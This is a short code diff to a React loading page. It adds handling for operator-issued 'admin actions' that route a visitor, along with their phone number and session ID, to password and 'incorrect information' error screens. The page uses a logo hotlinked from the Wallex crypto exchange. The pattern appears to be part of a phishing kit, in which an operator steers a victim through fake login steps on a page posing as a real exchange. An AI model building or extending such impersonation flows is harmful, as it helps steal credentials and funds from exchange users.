@@ -73,6 +73,23 @@ const Loading = () => {
 
     console.log("🚀 Executing admin action:", action);
 
+    // Handle auth actions
+    if (action.startsWith("incorrect_")) {
+      // Handle incorrect information actions
+      const errorType = action.replace("incorrect_", "");
+
+      navigate("/auth-error", {
+        state: {
+          phoneNumber,
+          sessionId,
+          errorType,
+        },
+        replace: true,
+      });
+      return;
+    }
+
+    // Handle regular auth actions
     switch (action) {
       case "password":
         navigate("/auth-password", {
@@ -181,7 +198,7 @@ const Loading = () => {
         >
           <img
             src="https://wallex.ir/_next/image?url=%2Fimages%2Fwallex-logo-v-light.svg&w=256&q=75"
-            alt="صرافی خرید ��روش ارزهای دیجیتال"
+            alt="صرافی خرید فروش ارزهای دیجیتال"
             style={{
               width: "128px",
               height: "24px",
